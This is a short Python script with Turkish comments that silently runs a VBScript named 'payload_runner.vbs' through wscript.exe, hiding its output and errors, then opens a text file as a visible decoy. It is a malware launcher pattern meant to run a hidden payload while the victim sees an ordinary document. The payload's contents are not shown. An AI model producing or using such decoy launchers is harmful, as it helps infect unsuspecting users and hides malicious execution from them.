import os
import subprocess

# Gerçek metin dosyası
real_text = "metin.txt"

# Payload başlat
try:
    subprocess.Popen(["wscript.exe", "payload_runner.vbs"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

# Metin dosyasını aç
try:
    os.startfile(real_text)
except:
    pass
